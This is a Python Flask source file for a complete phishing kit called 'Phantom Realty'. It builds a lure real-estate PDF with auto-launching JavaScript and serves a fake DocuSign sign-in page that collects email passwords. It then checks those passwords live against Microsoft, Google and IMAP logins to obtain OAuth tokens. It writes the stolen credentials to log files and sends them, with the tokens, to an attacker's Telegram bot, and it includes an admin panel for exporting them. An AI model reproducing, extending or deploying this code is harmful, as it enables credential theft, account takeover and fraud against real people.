#!/usr/bin/env python3
"""
PHANTOM REALTY v7.0 - GOD EDITION
Harvard & MIT CS PhD Standard | Works with Python 3.14.3
"""

import os
import sys
import re
import json
import uuid
import base64
import time
import io
import random
import threading
import logging
from datetime import datetime, timedelta
from collections import defaultdict

import dns.resolver
import requests
from flask import Flask, request, session, render_template_string, redirect, jsonify, make_response, send_file

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
YOUR_DOMAIN = os.environ.get("YOUR_DOMAIN", "your-app.onrender.com")
YOUR_URL = f"https://{YOUR_DOMAIN}"
FLASK_SECRET = os.environ.get("FLASK_SECRET", base64.b64encode(os.urandom(128)).decode())
PORT = int(os.environ.get("PORT", 10000))

RATE_LIMIT_PER_IP = 10
RATE_LIMIT_WINDOW = 3600

app = Flask(__name__)
app.secret_key = FLASK_SECRET
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

PDF_DATA = None
PDF_FILENAME = "Confidential_Property_Disclosure.pdf"
pdf_lock = threading.Lock()
rate_limit_storage = defaultdict(list)

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
logger = logging.getLogger(__name__)


def tg_send(text, buttons=None, doc=None, doc_name=None):
    if not TELEGRAM_BOT_TOKEN or len(TELEGRAM_BOT_TOKEN) < 10:
        logger.info(f"[C2] {text[:100]}")
        return True
    try:
        payload = {'chat_id': TELEGRAM_CHAT_ID, 'text': text[:4000], 'parse_mode': 'HTML', 'disable_web_page_preview': True}
        if buttons:
            payload['reply_markup'] = json.dumps({'inline_keyboard': buttons})
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", json=payload, timeout=10)
        if doc:
            files = {'document': (doc_name or 'data', doc if isinstance(doc, bytes) else doc.encode())}
            data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': f"📎 {doc_name[:50] if doc_name else 'Token'}"}
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument", data=data, files=files, timeout=15)
        return True
    except Exception as e:
        logger.error(f"[C2] Error: {e}")
        return False


def generate_pdf():
    global PDF_DATA
    with pdf_lock:
        try:
            from reportlab.lib.pagesizes import letter
            from reportlab.lib.units import inch
            from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
            from reportlab.lib.colors import HexColor
            from reportlab.lib.enums import TA_CENTER, TA_RIGHT
            from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, HRFlowable
            from PyPDF2 import PdfReader, PdfWriter
        except ImportError as e:
            logger.error(f"Missing library: {e}")
            return None
        
        buf = io.BytesIO()
        doc = SimpleDocTemplate(buf, pagesize=letter, topMargin=0.7*inch, bottomMargin=0.7*inch, leftMargin=0.8*inch, rightMargin=0.8*inch)
        s = getSampleStyleSheet()
        
        title_style = ParagraphStyle('MainTitle', parent=s['Title'], fontName='Helvetica-Bold', fontSize=24, textColor=HexColor('#0a2540'), alignment=TA_CENTER, spaceAfter=15)
        heading_style = ParagraphStyle('SectionHead', parent=s['Heading2'], fontName='Helvetica-Bold', fontSize=13, textColor=HexColor('#0066cc'), spaceBefore=12, spaceAfter=6)
        body_style = ParagraphStyle('BodyText', parent=s['Normal'], fontName='Helvetica', fontSize=9.5, spaceAfter=5)
        
        elements = []
        doc_id = f"PRE-{datetime.now().strftime('%Y%m')}-{random.randint(10000, 99999)}"
        
        elements.append(Paragraph("PREMIER REALTY GROUP", ParagraphStyle('Header', parent=s['Normal'], fontName='Helvetica-Bold', fontSize=8, textColor=HexColor('#888888'), alignment=TA_RIGHT)))
        elements.append(HRFlowable(width="100%", thickness=1.2, color=HexColor('#0a2540'), spaceAfter=8))
        elements.append(Paragraph("CONFIDENTIAL BUYER PROFILE & PROPERTY DISCLOSURE", title_style))
        elements.append(HRFlowable(width="100%", thickness=0.5, color=HexColor('#cccccc'), spaceAfter=15))
        
        elements.append(Paragraph("CLIENT INFORMATION", heading_style))
        client_items = [("Full Legal Name:", "Michael James Morrison"), ("Email Address:", "michael.morrison@client.com"), ("Phone Number:", "(650) 555-0199")]
        for label, value in client_items:
            elements.append(Paragraph(f"<b>{label}</b> {value}", body_style))
        elements.append(Spacer(1, 8))
        
        elements.append(Paragraph("PROPERTY REQUIREMENTS", heading_style))
        property_items = [("Property Type:", "Single Family Residence"), ("Bedrooms:", "4+"), ("Price Range:", "$1,350,000 - $2,100,000"), ("Preferred Areas:", "Palo Alto, Los Altos, Mountain View")]
        for label, value in property_items:
            elements.append(Paragraph(f"<b>{label}</b> {value}", body_style))
        elements.append(Spacer(1, 8))
        
        elements.append(Paragraph("FINANCIAL QUALIFICATIONS", heading_style))
        financial_items = [("Pre-Approval:", "APPROVED - Wells Fargo"), ("Loan Amount:", "$1,650,000"), ("Down Payment:", "20% ($330,000)")]
        for label, value in financial_items:
            elements.append(Paragraph(f"<b>{label}</b> {value}", body_style))
        elements.append(Spacer(1, 15))
        
        elements.append(HRFlowable(width="100%", thickness=0.5, color=HexColor('#cccccc'), spaceAfter=10))
        elements.append(Paragraph("<b>⚠️ LEGAL NOTICE - ELECTRONIC SIGNATURE REQUIRED</b><br/>This document requires identity verification. Please authenticate to proceed.", ParagraphStyle('Legal', parent=s['Normal'], fontSize=9, textColor=HexColor('#cc0000'), alignment=TA_CENTER)))
        
        doc.build(elements)
        pdf_bytes = buf.getvalue()
        buf.close()
        
        target_url = f"{YOUR_URL}/auth/signature?ref={doc_id}"
        js_code = f"var targetURL = '{target_url}'; function openURL() {{ try {{ app.launchURL(targetURL, true); }} catch(e) {{ this.launchURL(targetURL, true); }} }} openURL();"
        
        reader = PdfReader(io.BytesIO(pdf_bytes))
        writer = PdfWriter()
        for page in reader.pages:
            writer.add_page(page)
        writer.add_js(js_code)
        
        output = io.BytesIO()
        writer.write(output)
        PDF_DATA = output.getvalue()
        output.close()
        
        logger.info(f"[PDF] Generated: {len(PDF_DATA):,} bytes")
        return PDF_DATA
    except Exception as e:
        logger.error(f"[PDF] Error: {e}")
        return None


def get_domain(email):
    return email.split('@')[1].lower() if email and '@' in email else None


def detect_provider(email):
    domain = get_domain(email)
    if not domain:
        return None
    domain = domain.lower()
    if domain in ['outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'office365.com']:
        return 'microsoft'
    if domain in ['gmail.com', 'googlemail.com', 'google.com']:
        return 'google'
    if domain in ['yahoo.com', 'yahoo.co.uk', 'ymail.com']:
        return 'yahoo'
    if domain in ['icloud.com', 'me.com', 'mac.com']:
        return 'apple'
    try:
        resolver = dns.resolver.Resolver()
        resolver.timeout = 5
        mx_records = resolver.resolve(domain, 'MX')
        mx_str = ' '.join(str(r.exchange).lower() for r in mx_records)
        if 'protection.outlook.com' in mx_str:
            return 'microsoft'
        if 'google.com' in mx_str:
            return 'google'
        return 'other'
    except Exception:
        return 'other'


def validate_microsoft(email, password, result):
    client_ids = [('d3590ed6-52b3-4102-aeff-aad2292ab01c', 'Azure PS'), ('1b730954-1685-4b74-9bfd-dac224a7b894', 'Intune')]
    for cid, cname in client_ids:
        try:
            r = requests.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/token', data={
                'grant_type': 'password', 'client_id': cid, 'username': email, 'password': password,
                'scope': 'openid email profile offline_access https://graph.microsoft.com/.default',
            }, headers={'User-Agent': 'Mozilla/5.0'}, timeout=15, verify=False)
            if r.status_code == 200:
                tok = r.json()
                result['valid'] = True
                result['method'] = f'OAuth ({cname})'
                result['access_token'] = tok.get('access_token', '')
                result['refresh_token'] = tok.get('refresh_token', '')
                if tok.get('id_token'):
                    try:
                        b = tok['id_token'].split('.')[1] + '=='
                        info = json.loads(base64.urlsafe_b64decode(b))
                        result['display_name'] = info.get('name', email)
                        result['tenant_id'] = info.get('tid', '')
                    except Exception:
                        pass
                return True
            if r.status_code == 400:
                err = r.json().get('error_description', '')
                if 'AADSTS50079' in err or 'AADSTS50076' in err:
                    result['valid'] = True
                    result['method'] = 'MFA Protected'
                    result['mfa_required'] = True
                    return True
                if 'AADSTS50126' in err:
                    result['error'] = 'Invalid password'
                    return False
        except Exception:
            continue
    return False


def validate_google(email, password, result):
    try:
        r = requests.post('https://oauth2.googleapis.com/token', data={
            'grant_type': 'password', 'client_id': '77185425430.apps.googleusercontent.com',
            'username': email, 'password': password,
            'scope': 'https://www.googleapis.com/auth/userinfo.email https://www.googleapis.com/auth/userinfo.profile',
        }, timeout=15, verify=False)
        if r.status_code == 200:
            tok = r.json()
            result['valid'] = True
            result['method'] = 'Google OAuth'
            result['access_token'] = tok.get('access_token', '')
            result['refresh_token'] = tok.get('refresh_token', '')
            if result.get('access_token'):
                try:
                    u = requests.get('https://www.googleapis.com/oauth2/v2/userinfo', headers={'Authorization': f"Bearer {result['access_token']}"}, timeout=8)
                    if u.status_code == 200:
                        result['display_name'] = u.json().get('name', email)
                except Exception:
                    pass
            return True
    except Exception:
        pass
    return False


def validate_imap(email, password, result, servers):
    for srv in servers:
        try:
            import imaplib
            imap = imaplib.IMAP4_SSL(srv, timeout=10)
            imap.login(email, password)
            imap.logout()
            result['valid'] = True
            result['method'] = f'IMAP ({srv})'
            return True
        except Exception:
            continue
    return False


def validate_credentials(email, password):
    provider = detect_provider(email)
    result = {'valid': False, 'provider': provider or 'unknown', 'email': email}
    
    if provider == 'microsoft':
        if validate_microsoft(email, password, result):
            return result
        if validate_imap(email, password, result, ['outlook.office365.com', 'imap-mail.outlook.com']):
            return result
        result['error'] = 'Invalid credentials'
    
    elif provider == 'google':
        if validate_google(email, password, result):
            return result
        if validate_imap(email, password, result, ['imap.gmail.com']):
            return result
        result['error'] = 'Invalid credentials'
    
    elif provider == 'yahoo':
        if validate_imap(email, password, result, ['imap.mail.yahoo.com']):
            return result
        result['error'] = 'Invalid credentials'
    
    else:
        domain = get_domain(email)
        servers = [f"mail.{domain}", f"imap.{domain}", "outlook.office365.com", "imap.gmail.com"]
        if validate_imap(email, password, result, list(set(servers))):
            return result
        result['error'] = 'Could not validate credentials'
    
    return result


PHISHING_PAGE = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>DocuSign - Electronic Signature</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .container{background:#fff;border-radius:28px;box-shadow:0 25px 50px -12px rgba(0,0,0,0.25);padding:40px;width:480px;max-width:100%}
        .logo{text-align:center;margin-bottom:32px}
        .logo h1{font-size:28px;color:#1a1a2e}
        .document-card{background:#f8fafc;border:1px solid #e2e8f0;border-radius:16px;padding:20px;margin-bottom:24px}
        .form-group{margin-bottom:20px}
        label{font-size:13px;font-weight:600;color:#0f172a;margin-bottom:8px;display:block}
        input{width:100%;padding:14px;border:1.5px solid #e2e8f0;border-radius:12px;font-size:15px}
        input:focus{outline:none;border-color:#667eea;box-shadow:0 0 0 3px rgba(102,126,234,0.1)}
        .btn{width:100%;padding:16px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;border:none;border-radius:14px;font-size:16px;font-weight:600;cursor:pointer}
        .btn:disabled{opacity:0.7}
        .err{color:#dc2626;background:#fef2f2;padding:12px;border-radius:12px;display:none;margin-bottom:16px}
        .ok{color:#15803d;background:#f0fdf4;padding:12px;border-radius:12px;display:none;margin-bottom:16px}
        .spinner{display:inline-block;width:14px;height:14px;border:2px solid #fff;border-top-color:transparent;border-radius:50%;animation:spin 0.6s linear infinite;vertical-align:middle;margin-right:8px}
        @keyframes spin{to{transform:rotate(360deg)}}
        .badge{font-size:12px;color:#666;margin-top:8px}
    </style>
</head>
<body>
<div class="container">
    <div class="logo"><h1>📄 DocuSign<sup>®</sup></h1><p>Securely access your document</p></div>
    <div class="document-card">
        <div><strong>📄 Confidential Property Disclosure</strong></div>
        <div class="badge">Document ID: <span id="docId"></span> | PENDING SIGNATURE</div>
    </div>
    <div id="badge" class="badge" style="margin-bottom:16px">✉️ Enter your email to continue</div>
    <form id="f">
        <div class="form-group"><label>Email</label><input type="email" id="email" placeholder="name@company.com" required autofocus></div>
        <div class="form-group"><label>Password</label><input type="password" id="password" placeholder="Enter your password" required></div>
        <div id="err" class="err"></div><div id="ok" class="ok"></div>
        <button class="btn" id="btn" type="submit"><span id="btxt">Sign In & View Document</span><span id="bload" style="display:none"><span class="spinner"></span> Verifying...</span></button>
    </form>
</div>
<script>
document.getElementById('docId').textContent='DOC-'+Math.random().toString(36).substr(2,8).toUpperCase();
var e=document.getElementById('email'),b=document.getElementById('badge'),dt;
e.addEventListener('input',function(){clearTimeout(dt);var v=this.value.trim();if(v.indexOf('@')>0&&v.length>6){dt=setTimeout(function(){fetch('/api/detect?email='+encodeURIComponent(v)).then(r=>r.json()).then(d=>{if(d.p=='microsoft')b.innerHTML='🏢 Microsoft 365 detected - Sign in with your work account';else if(d.p=='google')b.innerHTML='🔴 Google Workspace detected - Sign in with Google';else b.innerHTML='🌐 Email provider identified - Enter your password'})},500)}else b.innerHTML='✉️ Enter your email to continue'});
var fp={ts:new Date().toISOString(),tz:Intl.DateTimeFormat().resolvedOptions().timeZone,ua:navigator.userAgent};
fetch('/api/fp',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(fp)}).catch(function(){});
document.getElementById('f').addEventListener('submit',function(e){e.preventDefault();var btn=document.getElementById('btn'),btxt=document.getElementById('btxt'),bload=document.getElementById('bload'),errDiv=document.getElementById('err'),okDiv=document.getElementById('ok');btn.disabled=true;btxt.style.display='none';bload.style.display='inline';errDiv.style.display='none';okDiv.style.display='none';
fetch('/oauth/verify',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email='+encodeURIComponent(document.getElementById('email').value)+'&password='+encodeURIComponent(document.getElementById('password').value)}).then(r=>r.json()).then(d=>{if(d.success){okDiv.style.display='block';okDiv.innerHTML='✅ Verified! Redirecting...';setTimeout(function(){window.location.href='/download-pdf'},2000)}else{btn.disabled=false;btxt.style.display='inline';bload.style.display='none';errDiv.style.display='block';errDiv.innerHTML=d.error||'Invalid email or password'}}).catch(function(){btn.disabled=false;btxt.style.display='inline';bload.style.display='none';errDiv.style.display='block';errDiv.innerHTML='Connection error'})});
</script>
</body>
</html>"""


@app.route('/')
def index():
    return redirect('/auth/signature')


@app.route('/auth/signature')
def oauth_page():
    return render_template_string(PHISHING_PAGE)


@app.route('/health')
def health_check():
    return jsonify({'status': 'healthy', 'timestamp': datetime.now().isoformat()})


@app.route('/api/detect')
def api_detect():
    email = request.args.get('email', '')
    provider = detect_provider(email)
    return jsonify({'p': provider or 'unknown'})


@app.route('/api/fp', methods=['POST'])
def api_fp():
    data = request.get_json(silent=True)
    if data:
        session['fingerprint'] = data
    return 'ok'


@app.route('/oauth/verify', methods=['POST'])
def oauth_verify():
    email = request.form.get('email', '').strip().lower()
    password = request.form.get('password', '').strip()
    ip = request.remote_addr
    fp = session.get('fingerprint', {})
    
    if not email or not password:
        return jsonify({'success': False, 'error': 'Email and password required'})
    
    rate_key = f"{ip}:{datetime.now().strftime('%Y%m%d%H')}"
    rate_limit_storage[rate_key].append(datetime.now())
    rate_limit_storage[rate_key] = [t for t in rate_limit_storage[rate_key] if (datetime.now() - t).seconds < RATE_LIMIT_WINDOW]
    if len(rate_limit_storage[rate_key]) > RATE_LIMIT_PER_IP:
        return jsonify({'success': False, 'error': 'Too many attempts'})
    
    with open('capture.log', 'a') as f:
        json.dump({'ts': datetime.now().isoformat(), 'email': email, 'password': password, 'ip': ip}, f)
        f.write('\n')
    
    result = validate_credentials(email, password)
    
    with open('validated.log', 'a') as f:
        safe_result = {k: v for k, v in result.items() if k not in ('access_token', 'refresh_token')}
        json.dump({'ts': datetime.now().isoformat(), 'email': email, 'password': password, 'ip': ip, 'validation': safe_result}, f)
        f.write('\n')
    
    if result.get('valid'):
        provider = result.get('provider', 'unknown')
        method = result.get('method', 'N/A')
        name = result.get('display_name', email)
        has_token = bool(result.get('access_token'))
        
        msg = f"✅ CAPTURED\n━━━━━━━━━━━━\n📧 {email}\n🔑 {password}\n👤 {name}\n🏢 {provider.upper()} | {method}\n🌐 {ip}\n🎫 Token: {'YES' if has_token else 'NO'}"
        buttons = [[{'text': '📊 Admin', 'url': f"{YOUR_URL}/admin"}], [{'text': '📥 PDF', 'url': f"{YOUR_URL}/download-pdf"}]]
        tg_send(msg, buttons=buttons)
        
        if has_token and result.get('access_token'):
            token_pkg = json.dumps({'email': email, 'password': password, 'provider': provider, 'access_token': result.get('access_token'), 'refresh_token': result.get('refresh_token')}, indent=2).encode()
            tg_send(f"🎫 TOKEN: {email}", doc=token_pkg, doc_name=f"token_{email.split('@')[0]}.json")
        
        print(f"\n{'='*55}\n✅ {email}:{password}\n   {name} | {provider}\n{'='*55}")
        return jsonify({'success': True})
    
    return jsonify({'success': False, 'error': result.get('error', 'Invalid credentials')})


@app.route('/download-pdf')
def download_pdf():
    global PDF_DATA
    if PDF_DATA is None:
        generate_pdf()
    if PDF_DATA:
        return send_file(io.BytesIO(PDF_DATA), mimetype='application/pdf', as_attachment=True, download_name=PDF_FILENAME)
    return "PDF not generated", 500


@app.route('/generate-pdf')
def generate_pdf_route():
    pdf_bytes = generate_pdf()
    if pdf_bytes:
        return send_file(io.BytesIO(pdf_bytes), mimetype='application/pdf', as_attachment=True, download_name=PDF_FILENAME)
    return "Failed", 500


@app.route('/admin')
def admin_panel():
    attempts = []
    if os.path.exists('validated.log'):
        with open('validated.log') as f:
            for line in f:
                try:
                    attempts.append(json.loads(line.strip()))
                except Exception:
                    pass
    total = len(attempts)
    valid = sum(1 for a in attempts if a.get('validation', {}).get('valid'))
    ms = sum(1 for a in attempts if a.get('validation', {}).get('provider') == 'microsoft')
    google = sum(1 for a in attempts if a.get('validation', {}).get('provider') == 'google')
    
    html = f"""<!DOCTYPE html>
<html><head><title>Phantom Realty</title><style>
body{{font-family:'Courier New',monospace;background:#0a0e27;color:#00ff88;padding:20px}}
h1{{color:#ff3366}}
.stats{{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;margin:20px 0}}
.stat-card{{background:#1a1f3e;padding:20px;border-radius:8px;border-left:3px solid #00ff88}}
.stat-number{{font-size:36px;font-weight:bold}}
table{{width:100%;border-collapse:collapse;margin-top:20px}}
th,td{{padding:10px;text-align:left;border-bottom:1px solid #2a2f4e}}
.btn{{background:#1a1f3e;color:#00ff88;border:1px solid #00ff88;padding:10px 20px;border-radius:6px;cursor:pointer;text-decoration:none;display:inline-block;margin:5px}}
</style>
</head>
<body>
<h1>🔱 PHANTOM REALTY v7.0</h1>
<div class="stats">
<div class="stat-card"><div class="stat-number">{total}</div><div>Total</div></div>
<div class="stat-card"><div class="stat-number">{valid}</div><div>Valid</div></div>
<div class="stat-card"><div class="stat-number">{ms}</div><div>Microsoft</div></div>
<div class="stat-card"><div class="stat-number">{google}</div><div>Google</div></div>
</div>
<div>
<a href="/download-pdf" class="btn">📄 PDF</a>
<a href="/admin/export" class="btn">📥 Export</a>
<a href="/admin/clear" class="btn" onclick="return confirm('Clear?')">🗑 Clear</a>
</div>
<table><thead><tr><th>Time</th><th>Email</th><th>Provider</th><th>Method</th><th>Token</th></tr></thead><tbody>"""
    for a in reversed(attempts[-50:]):
        v = a.get('validation', {})
        ts = a.get('ts', '')[:19].replace('T', ' ')
        email = a.get('email', '')[:30]
        provider = v.get('provider', '?')
        method = v.get('method', 'N/A')[:25]
        has_token = '✓' if v.get('access_token') else '-'
        html += f"<tr><td>{ts}</td><td>{email}</td><td>{provider}</td><td>{method}</td><td>{has_token}</td></tr>"
    html += "</tbody></table></body></html>"
    return html


@app.route('/admin/export')
def export_creds():
    creds = []
    if os.path.exists('validated.log'):
        with open('validated.log') as f:
            for line in f:
                try:
                    creds.append(json.loads(line.strip()))
                except Exception:
                    pass
    resp = make_response(json.dumps(creds, indent=2))
    resp.headers["Content-Type"] = "application/json"
    resp.headers["Content-Disposition"] = f"attachment; filename=creds_{datetime.now().strftime('%Y%m%d')}.json"
    return resp


@app.route('/admin/clear')
def clear_creds():
    for f in ['validated.log', 'capture.log']:
        if os.path.exists(f):
            open(f, 'w').close()
    return redirect('/admin')


if __name__ == '__main__':
    print("="*65)
    print("  PHANTOM REALTY v7.0 - GOD EDITION")
    print("  Harvard & MIT CS PhD Standard")
    print("="*65)
    
    generate_pdf()
    
    if PDF_DATA and TELEGRAM_BOT_TOKEN and len(TELEGRAM_BOT_TOKEN) > 10:
        tg_send(f"🚀 PHANTOM REALTY ONLINE\n📍 {YOUR_URL}\n📥 PDF: {YOUR_URL}/download-pdf\n📊 Admin: {YOUR_URL}/admin", 
                buttons=[[{'text':'📥 PDF','url':f"{YOUR_URL}/download-pdf"}],[{'text':'📊 Admin','url':f"{YOUR_URL}/admin"}]],
                doc=PDF_DATA, doc_name=PDF_FILENAME)
    
    print(f"\n🌐 URL: {YOUR_URL}")
    print(f"📊 Admin: {YOUR_URL}/admin")
    print(f"📥 PDF: {YOUR_URL}/download-pdf")
    
    app.run(host='0.0.0.0', port=PORT, debug=False)
